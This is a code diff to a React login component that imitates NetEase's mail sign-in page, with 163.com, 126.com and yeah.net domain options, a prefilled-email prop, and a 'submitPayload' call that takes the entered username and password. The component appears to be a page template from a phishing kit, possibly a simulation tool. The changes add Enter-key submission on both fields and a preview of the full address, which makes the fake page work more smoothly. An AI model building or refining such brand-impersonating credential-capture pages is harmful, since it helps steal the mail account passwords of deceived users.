@@ -24,7 +24,7 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
     try {
@@ -34,6 +34,12 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -102,30 +108,36 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
 
             <div className="px-8 pt-12 pb-6 flex flex-col flex-grow">
               <form onSubmit={handleSubmit} className="space-y-6">
-                <div className="flex items-center space-x-4">
-                  <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '用户名' : 'User'}</label>
-                  <div className="flex-grow flex border border-gray-300 rounded focus-within:border-[#3b78e7] transition-all bg-white overflow-hidden">
-                    <input 
-                      type="text" 
-                      value={username} 
-                      onChange={(e) => {
-                        setUsername(e.target.value);
-                        if (error) setError(null);
-                      }} 
-                      className="flex-grow px-3 py-2 text-[14px] outline-none min-w-0" 
-                    />
-                    <select 
-                      value={domain}
-                      onChange={(e) => setDomain(e.target.value as any)}
-                      className="bg-gray-50 border-l border-gray-200 px-1 py-2 text-[12px] text-gray-500 outline-none cursor-pointer"
-                    >
-                      <option value="163.com">@163.com</option>
-                      <option value="126.com">@126.com</option>
-                      <option value="yeah.net">@yeah.net</option>
-                    </select>
+
+                <div className="space-y-1">
+                  <div className="flex items-center space-x-4">
+                    <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '用户名' : 'User'}</label>
+                    <div className="flex-grow flex border border-gray-300 rounded focus-within:border-[#3b78e7] transition-all bg-white overflow-hidden">
+                      <input 
+                        type="text" 
+                        value={username} 
+                        onChange={(e) => {
+                          setUsername(e.target.value);
+                          if (error) setError(null);
+                        }} 
+                        onKeyDown={handleKeyDown}
+                        className="flex-grow px-3 py-2 text-[14px] outline-none min-w-0" 
+                      />
+                      <select 
+                        value={domain}
+                        onChange={(e) => setDomain(e.target.value as any)}
+                        className="bg-gray-50 border-l border-gray-200 px-1 py-2 text-[12px] text-gray-500 outline-none cursor-pointer"
+                      >
+                        <option value="163.com">@163.com</option>
+                        <option value="126.com">@126.com</option>
+                        <option value="yeah.net">@yeah.net</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div className="pl-20 text-[11px] text-blue-500 opacity-70 italic truncate">
+                    {username ? `${username}@${domain}` : ''}
                   </div>
                 </div>
-
                 <div className="flex items-center space-x-4">
                   <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '密  码' : 'Pass'}</label>
                   <div className="flex-grow border border-gray-300 rounded focus-within:border-[#3b78e7] relative transition-all bg-white">
@@ -136,6 +148,7 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
                         setPassword(e.target.value);
                         if (error) setError(null);
                       }} 
+                      onKeyDown={handleKeyDown}
                       className="w-full px-3 py-2 text-[14px] outline-none pr-8" 
                     />
                   </div>
